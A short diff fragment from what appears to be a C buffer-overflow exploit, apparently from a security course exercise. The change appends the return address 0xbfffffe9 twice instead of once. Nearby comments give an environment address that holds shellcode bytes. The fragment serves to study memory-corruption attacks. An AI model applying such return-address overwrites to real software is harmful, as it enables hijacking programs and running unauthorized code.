@@ -23,7 +23,7 @@ int main(void)
   // strcat(str, "\x97\xff\xff\xbf");
   // env: 0xbfffff97:	0xdb31c031
 
-  strcat(str, "\xe9\xff\xff\xbf");
+  strcat(str, "\xe9\xff\xff\xbf\xe9\xff\xff\xbf");
 
   args[0] = TARGET;
   // max input size is 4 * 5 = 20
